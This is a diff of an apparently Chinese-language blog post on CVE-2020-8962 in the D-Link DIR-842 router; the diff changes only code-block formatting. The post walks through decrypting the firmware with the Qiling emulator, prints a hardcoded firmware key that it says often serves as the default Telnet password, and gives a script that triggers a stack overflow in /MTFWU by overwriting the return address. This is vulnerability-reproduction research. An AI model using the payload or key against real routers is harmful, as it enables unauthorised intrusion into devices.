@@ -184,34 +184,34 @@ layui.use('element', function(){
 </li>
 </ol>
 <p>在這個例子中最後定位到下方程式碼</p>
-<pre><code class="language-php=" data-lang="php=">// --- snip ---
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php">// --- snip ---
 // fw encimg 
-setattr(&quot;/runtime/tmpdevdata/image_sign&quot; ,&quot;get&quot;,&quot;cat /etc/config/image_sign&quot;);
-$image_sign = query(&quot;/runtime/tmpdevdata/image_sign&quot;);
+setattr(&#34;/runtime/tmpdevdata/image_sign&#34; ,&#34;get&#34;,&#34;cat /etc/config/image_sign&#34;);
+$image_sign = query(&#34;/runtime/tmpdevdata/image_sign&#34;);
                               
-setattr(&quot;/runtime/tmpdevdata/encimg&quot; ,&quot;get&quot;,&quot;encimg -d -i &quot;.$fw_path.&quot; -s &quot;.$image_sign.&quot; &gt; /dev/console \n&quot;);
-query(&quot;/runtime/tmpdevdata/encimg&quot;);                                                
+setattr(&#34;/runtime/tmpdevdata/encimg&#34; ,&#34;get&#34;,&#34;encimg -d -i &#34;.$fw_path.&#34; -s &#34;.$image_sign.&#34; &gt; /dev/console \n&#34;);
+query(&#34;/runtime/tmpdevdata/encimg&#34;);                                                
       
-setattr(&quot;/runtime/chfw&quot;,  &quot;get&quot;, &quot;fwupdater -v &quot;.$fw_path.&quot;; echo $?&quot;);
-return get(&quot;&quot;,&quot;/runtime/chfw&quot;);
+setattr(&#34;/runtime/chfw&#34;,  &#34;get&#34;, &#34;fwupdater -v &#34;.$fw_path.&#34;; echo $?&#34;);
+return get(&#34;&#34;,&#34;/runtime/chfw&#34;);
 // --- snip --
-</code></pre><p>第 6 行可以看到 <code>encimg</code> 這個指令負責解密或是解碼韌體檔案，<code>fw_path</code> 應該是韌體檔案路徑，<code>image_sign</code> 則為某種密鑰，順帶一提 <code>image_sign</code> 常常被 D-Link 系列拿來當作預設Telnet的密碼</p>
+</code></pre></div><p>第 6 行可以看到 <code>encimg</code> 這個指令負責解密或是解碼韌體檔案，<code>fw_path</code> 應該是韌體檔案路徑，<code>image_sign</code> 則為某種密鑰，順帶一提 <code>image_sign</code> 常常被 D-Link 系列拿來當作預設Telnet的密碼</p>
 <p>同樣的方式找到了 <code>encimg</code> 位於 <code>/usr/sbin/encimg</code> 之後 Qiling 就派上用場了</p>
-<pre><code class="language-python=" data-lang="python=">from qiling import *
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">from</span> qiling <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
 
-ql = Qiling([&quot;squashfs-root/usr/sbin/encimg&quot;], &quot;squashfs-root&quot;, console=False)
-ql.run()
-</code></pre><p>簡單的三行程式碼將 <code>encimg</code> 跑起來看看，結果如下</p>
+ql <span style="color:#f92672">=</span> Qiling([<span style="color:#e6db74">&#34;squashfs-root/usr/sbin/encimg&#34;</span>], <span style="color:#e6db74">&#34;squashfs-root&#34;</span>, console<span style="color:#f92672">=</span>False)
+ql<span style="color:#f92672">.</span>run()
+</code></pre></div><p>簡單的三行程式碼將 <code>encimg</code> 跑起來看看，結果如下</p>
 <p><img src="/images/CVE_2020_8962/1.png" alt=""></p>
 <p>可以看到出現 <code>no signature specified!</code> 的錯誤訊息之外，還有詳細的參數解釋跟剛剛的程式碼兩相對照，與一開始的猜測所差無幾</p>
 <p>到了這裡基本上解密已經不是問題了，將加密過的韌體放到 <code>squashfs-root</code> 中，並稍微改一下 python script 就可以了</p>
-<pre><code class="language-python=" data-lang="python=">from qiling import *
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">from</span> qiling <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
 
-ql = Qiling([&quot;squashfs-root/usr/sbin/encimg&quot;, &quot;-d&quot;,
-            &quot;-i&quot;, &quot;DIR842C1_FW313WWb05.bin&quot;,
-            &quot;-s&quot;, &quot;wrgac65_dlink.2015_dir842&quot;], &quot;squashfs-root&quot;, console=False)
-ql.run()
-</code></pre><p>下圖為執行前後對比，可以明顯看到原本什麼都不認得的 <code>binwalk</code> 在解密腳本執行完後，就可以正常辨識了</p>
+ql <span style="color:#f92672">=</span> Qiling([<span style="color:#e6db74">&#34;squashfs-root/usr/sbin/encimg&#34;</span>, <span style="color:#e6db74">&#34;-d&#34;</span>,
+            <span style="color:#e6db74">&#34;-i&#34;</span>, <span style="color:#e6db74">&#34;DIR842C1_FW313WWb05.bin&#34;</span>,
+            <span style="color:#e6db74">&#34;-s&#34;</span>, <span style="color:#e6db74">&#34;wrgac65_dlink.2015_dir842&#34;</span>], <span style="color:#e6db74">&#34;squashfs-root&#34;</span>, console<span style="color:#f92672">=</span>False)
+ql<span style="color:#f92672">.</span>run()
+</code></pre></div><p>下圖為執行前後對比，可以明顯看到原本什麼都不認得的 <code>binwalk</code> 在解密腳本執行完後，就可以正常辨識了</p>
 <p><img src="/images/CVE_2020_8962/2.png" alt=""></p>
 <h3 id="reproduce-the-bug-with-qiling-framework">Reproduce the bug with Qiling Framework</h3>
 <p>根據分析文表示在 <code>/MTFWU</code> 這個路徑有 stack-based buffer overflow，詳細位置可以看原文分析，下面貼出我自己整理過的截圖</p>
@@ -225,91 +225,91 @@ ql.run()
 <p><img src="/images/CVE_2020_8962/5.png" alt=""></p>
 <p><img src="/images/CVE_2020_8962/6.png" alt=""></p>
 <p>於此，我們需要加入 hook sysinfo function 的相關程式碼, 並使用 <code>python3 -c 'print(&quot;AAAA\x00&quot;+&quot;A&quot;*0xbf)' &gt; /var/session/c1</code> 建立 <code>/var/session/c1</code></p>
-<pre><code class="language-python=" data-lang="python=">def my_syscall_sysinfo(ql, sysinfo_info, *args, **kwargs):
-    ql.mem.write(sysinfo_info, b&quot;AAAA&quot;) # uptime
-    regreturn = 0
-    ql.nprint(&quot;sysinfo(0x%x) = %d&quot; % (sysinfo_info, regreturn))
-    ql.os.definesyscall_return(regreturn)
-</code></pre><p>再來，因為程式使用 <code>getenv</code> 來取得封包相關的訊息，也需要將對應的字串放入環境變數中，還好 Qiling 可以很輕易地做到這件事情</p>
-<pre><code class="language-python=" data-lang="python=">envs = {
-        &quot;REQUEST_METHOD&quot;: &quot;POST&quot;,
-        &quot;REQUEST_URI&quot;: &quot;/MTFWU&quot;,
-        &quot;CONTENT_TYPE&quot;: &quot;application/x-www-form-urlencoded&quot;,
-        &quot;HTTP_MTFWU_ACT&quot;: &quot;Login&quot;,
-        &quot;HTTP_COOKIE&quot;: &quot;uid=AAAA&quot;,
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">my_syscall_sysinfo</span>(ql, sysinfo_info, <span style="color:#f92672">*</span>args, <span style="color:#f92672">**</span>kwargs):
+    ql<span style="color:#f92672">.</span>mem<span style="color:#f92672">.</span>write(sysinfo_info, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;AAAA&#34;</span>) <span style="color:#75715e"># uptime</span>
+    regreturn <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
+    ql<span style="color:#f92672">.</span>nprint(<span style="color:#e6db74">&#34;sysinfo(0x</span><span style="color:#e6db74">%x</span><span style="color:#e6db74">) = </span><span style="color:#e6db74">%d</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">%</span> (sysinfo_info, regreturn))
+    ql<span style="color:#f92672">.</span>os<span style="color:#f92672">.</span>definesyscall_return(regreturn)
+</code></pre></div><p>再來，因為程式使用 <code>getenv</code> 來取得封包相關的訊息，也需要將對應的字串放入環境變數中，還好 Qiling 可以很輕易地做到這件事情</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">envs <span style="color:#f92672">=</span> {
+        <span style="color:#e6db74">&#34;REQUEST_METHOD&#34;</span>: <span style="color:#e6db74">&#34;POST&#34;</span>,
+        <span style="color:#e6db74">&#34;REQUEST_URI&#34;</span>: <span style="color:#e6db74">&#34;/MTFWU&#34;</span>,
+        <span style="color:#e6db74">&#34;CONTENT_TYPE&#34;</span>: <span style="color:#e6db74">&#34;application/x-www-form-urlencoded&#34;</span>,
+        <span style="color:#e6db74">&#34;HTTP_MTFWU_ACT&#34;</span>: <span style="color:#e6db74">&#34;Login&#34;</span>,
+        <span style="color:#e6db74">&#34;HTTP_COOKIE&#34;</span>: <span style="color:#e6db74">&#34;uid=AAAA&#34;</span>,
         }
-</code></pre><p>同時，我們也追求整個模擬過程可以自動化進行無須人工介入，所以我們將 stdin 直接替換成一個 python object，讓我們可以在模擬程式需要 input 的時候，幫我們代勞</p>
-<pre><code class="language-python=" data-lang="python=">class Fake_stdin:
-    def read(self, size, *args, **kwargs):
-        # return payload for reading from stdin
-        return b'ACTION=login&amp;LOGINPASSWORD=' + b'A' * 0x248
+</code></pre></div><p>同時，我們也追求整個模擬過程可以自動化進行無須人工介入，所以我們將 stdin 直接替換成一個 python object，讓我們可以在模擬程式需要 input 的時候，幫我們代勞</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">Fake_stdin</span>:
+    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">read</span>(self, size, <span style="color:#f92672">*</span>args, <span style="color:#f92672">**</span>kwargs):
+        <span style="color:#75715e"># return payload for reading from stdin</span>
+        <span style="color:#66d9ef">return</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;ACTION=login&amp;LOGINPASSWORD=&#39;</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;A&#39;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">0x248</span>
 
-    def fileno(self, *args, **kwargs):
-        # return file descriptor
-        return 0
-</code></pre><p>最後，我們當然希望程式不要直接死去，最好是可以停留在 return 之前，讓我們可以觀察暫存器或是記憶體中的資料，這當然對 Qiling 來說跟喝水一樣簡單</p>
-<pre><code class="language-python=" data-lang="python=">
-# dump all registers
-def dump_reg(ql, *args, **kwargs):
-    for idx, val in ql.reg.save().items():
-        if not isinstance(idx, int):
-            print(idx, &quot;:&quot;, hex(val))
+    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">fileno</span>(self, <span style="color:#f92672">*</span>args, <span style="color:#f92672">**</span>kwargs):
+        <span style="color:#75715e"># return file descriptor</span>
+        <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>
+</code></pre></div><p>最後，我們當然希望程式不要直接死去，最好是可以停留在 return 之前，讓我們可以觀察暫存器或是記憶體中的資料，這當然對 Qiling 來說跟喝水一樣簡單</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">
+<span style="color:#75715e"># dump all registers</span>
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">dump_reg</span>(ql, <span style="color:#f92672">*</span>args, <span style="color:#f92672">**</span>kwargs):
+    <span style="color:#66d9ef">for</span> idx, val <span style="color:#f92672">in</span> ql<span style="color:#f92672">.</span>reg<span style="color:#f92672">.</span>save()<span style="color:#f92672">.</span>items():
+        <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> isinstance(idx, int):
+            <span style="color:#66d9ef">print</span>(idx, <span style="color:#e6db74">&#34;:&#34;</span>, hex(val))
             
     breakpoint()
 
-ql.hook_address(dump_reg, 0x41db40) # breakpoint before return
-</code></pre><p>將上面所提到的功能全部彙整到一起，就是一個可以引發 crash 的 python script 了</p>
-<pre><code class="language-python=" data-lang="python=">from qiling import *
+ql<span style="color:#f92672">.</span>hook_address(dump_reg, <span style="color:#ae81ff">0x41db40</span>) <span style="color:#75715e"># breakpoint before return</span>
+</code></pre></div><p>將上面所提到的功能全部彙整到一起，就是一個可以引發 crash 的 python script 了</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">from</span> qiling <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
 
-# hook function for syscall sysinfo
-def my_syscall_sysinfo(ql, sysinfo_info, *args, **kwargs):
-    ql.mem.write(sysinfo_info, b&quot;AAAA&quot;) # uptime
-    regreturn = 0
-    ql.log.info(f&quot;sysinfo(0x{sysinfo_info:02x}) = {regreturn}&quot;)
-    return regreturn
+<span style="color:#75715e"># hook function for syscall sysinfo</span>
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">my_syscall_sysinfo</span>(ql, sysinfo_info, <span style="color:#f92672">*</span>args, <span style="color:#f92672">**</span>kwargs):
+    ql<span style="color:#f92672">.</span>mem<span style="color:#f92672">.</span>write(sysinfo_info, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;AAAA&#34;</span>) <span style="color:#75715e"># uptime</span>
+    regreturn <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
+    ql<span style="color:#f92672">.</span>log<span style="color:#f92672">.</span>info(f<span style="color:#e6db74">&#34;sysinfo(0x{sysinfo_info:02x}) = {regreturn}&#34;</span>)
+    <span style="color:#66d9ef">return</span> regreturn
 
-# dump all registers
-def dump_reg(ql, *args, **kwargs):
-    ql.log.info(&quot;=&quot;*0x10 + &quot; register dump &quot; + &quot;=&quot;*0x10)
-    for idx, val in ql.reg.save().items():
-        if not isinstance(idx, int):
-            ql.log.info(f&quot;{idx}: {hex(val)}&quot;)
+<span style="color:#75715e"># dump all registers</span>
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">dump_reg</span>(ql, <span style="color:#f92672">*</span>args, <span style="color:#f92672">**</span>kwargs):
+    ql<span style="color:#f92672">.</span>log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">&#34;=&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">0x10</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34; register dump &#34;</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;=&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">0x10</span>)
+    <span style="color:#66d9ef">for</span> idx, val <span style="color:#f92672">in</span> ql<span style="color:#f92672">.</span>reg<span style="color:#f92672">.</span>save()<span style="color:#f92672">.</span>items():
+        <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> isinstance(idx, int):
+            ql<span style="color:#f92672">.</span>log<span style="color:#f92672">.</span>info(f<span style="color:#e6db74">&#34;{idx}: {hex(val)}&#34;</span>)
             
     breakpoint()
 
-# fake stdin for sending payload
-class Fake_stdin:
-    def read(self, size, *args, **kwargs):
-        return b'ACTION=login&amp;LOGINPASSWORD=' + b'A' * 0x248
+<span style="color:#75715e"># fake stdin for sending payload</span>
+<span style="color:#66d9ef">class</span> <span style="color:#a6e22e">Fake_stdin</span>:
+    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">read</span>(self, size, <span style="color:#f92672">*</span>args, <span style="color:#f92672">**</span>kwargs):
+        <span style="color:#66d9ef">return</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;ACTION=login&amp;LOGINPASSWORD=&#39;</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;A&#39;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">0x248</span>
 
-    def fileno(self, *args, **kwargs):
-        return 0
+    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">fileno</span>(self, <span style="color:#f92672">*</span>args, <span style="color:#f92672">**</span>kwargs):
+        <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>
 
-if __name__ == &quot;__main__&quot;:
+<span style="color:#66d9ef">if</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;__main__&#34;</span>:
 
-    envs = {
-            &quot;REQUEST_METHOD&quot;: &quot;POST&quot;,
-            &quot;REQUEST_URI&quot;: &quot;/MTFWU&quot;,
-            &quot;CONTENT_TYPE&quot;: &quot;application/x-www-form-urlencoded&quot;,
-            &quot;HTTP_MTFWU_ACT&quot;: &quot;Login&quot;,
-            &quot;HTTP_COOKIE&quot;: &quot;uid=AAAA&quot;,
-            &quot;CONTENT_LENGTH&quot;: str(27+0x248), 
+    envs <span style="color:#f92672">=</span> {
+            <span style="color:#e6db74">&#34;REQUEST_METHOD&#34;</span>: <span style="color:#e6db74">&#34;POST&#34;</span>,
+            <span style="color:#e6db74">&#34;REQUEST_URI&#34;</span>: <span style="color:#e6db74">&#34;/MTFWU&#34;</span>,
+            <span style="color:#e6db74">&#34;CONTENT_TYPE&#34;</span>: <span style="color:#e6db74">&#34;application/x-www-form-urlencoded&#34;</span>,
+            <span style="color:#e6db74">&#34;HTTP_MTFWU_ACT&#34;</span>: <span style="color:#e6db74">&#34;Login&#34;</span>,
+            <span style="color:#e6db74">&#34;HTTP_COOKIE&#34;</span>: <span style="color:#e6db74">&#34;uid=AAAA&#34;</span>,
+            <span style="color:#e6db74">&#34;CONTENT_LENGTH&#34;</span>: str(<span style="color:#ae81ff">27</span><span style="color:#f92672">+</span><span style="color:#ae81ff">0x248</span>), 
             }
 
-    ql = Qiling([&quot;squashfs-root/usr/sbin/mtfwu&quot;], &quot;squashfs-root&quot;, 
-                output=&quot;default&quot;,
-                env=envs,           # setting environment variables 
-                stdin=Fake_stdin()) # hijack stdin with Fake_stdin
+    ql <span style="color:#f92672">=</span> Qiling([<span style="color:#e6db74">&#34;squashfs-root/usr/sbin/mtfwu&#34;</span>], <span style="color:#e6db74">&#34;squashfs-root&#34;</span>, 
+                output<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;default&#34;</span>,
+                env<span style="color:#f92672">=</span>envs,           <span style="color:#75715e"># setting environment variables </span>
+                stdin<span style="color:#f92672">=</span>Fake_stdin()) <span style="color:#75715e"># hijack stdin with Fake_stdin</span>
                 
-    ql.set_syscall(&quot;sysinfo&quot;, my_syscall_sysinfo)  # syscall hook for sysinfo
-    ql.set_syscall(&quot;_newselect&quot;, lambda *_: None)  # hook syscall _newselect with anonymous NOP function to avoid manual input requirement
-    ql.hook_address(dump_reg, 0x41d3f0)            # breakpoint before return and dump all registers
+    ql<span style="color:#f92672">.</span>set_syscall(<span style="color:#e6db74">&#34;sysinfo&#34;</span>, my_syscall_sysinfo)  <span style="color:#75715e"># syscall hook for sysinfo</span>
+    ql<span style="color:#f92672">.</span>set_syscall(<span style="color:#e6db74">&#34;_newselect&#34;</span>, <span style="color:#66d9ef">lambda</span> <span style="color:#f92672">*</span>_: None)  <span style="color:#75715e"># hook syscall _newselect with anonymous NOP function to avoid manual input requirement</span>
+    ql<span style="color:#f92672">.</span>hook_address(dump_reg, <span style="color:#ae81ff">0x41d3f0</span>)            <span style="color:#75715e"># breakpoint before return and dump all registers</span>
 
-    with open(&quot;squashfs-root/var/session/c1&quot;, &quot;wb+&quot;) as fh: # setup propper session file
-        fh.write(b&quot;AAAA\x00&quot; + b&quot;A&quot;*0xbf)                   # first four bytes were the UID in cookie
+    <span style="color:#66d9ef">with</span> open(<span style="color:#e6db74">&#34;squashfs-root/var/session/c1&#34;</span>, <span style="color:#e6db74">&#34;wb+&#34;</span>) <span style="color:#66d9ef">as</span> fh: <span style="color:#75715e"># setup propper session file</span>
+        fh<span style="color:#f92672">.</span>write(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;AAAA</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;A&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">0xbf</span>)                   <span style="color:#75715e"># first four bytes were the UID in cookie</span>
 
-    ql.run()
-</code></pre><p>備註: 因為程式有使用到 <code>select</code> 等待 stdin 輸入，所以用一個空匿名函數取代掉 <code>ql_syscall__newselect</code>，讓 script 可以直接由 <code>Fake_stdin</code> 讀到 input</p>
+    ql<span style="color:#f92672">.</span>run()
+</code></pre></div><p>備註: 因為程式有使用到 <code>select</code> 等待 stdin 輸入，所以用一個空匿名函數取代掉 <code>ql_syscall__newselect</code>，讓 script 可以直接由 <code>Fake_stdin</code> 讀到 input</p>
 <p>整個不到 50 行的 python script 就可以把整個整個程式跑起來，並且斷點在 <code>0x41db40</code>，執行之後可以觀察到 <code>$fp($s8)</code> 跟 <code>$ra</code> 兩個暫存器都已經被覆蓋為 <code>AAAA</code> 了</p>
 <p><img src="/images/CVE_2020_8962/7.png" alt=""></p>
 <h3 id="conclusion">Conclusion</h3>
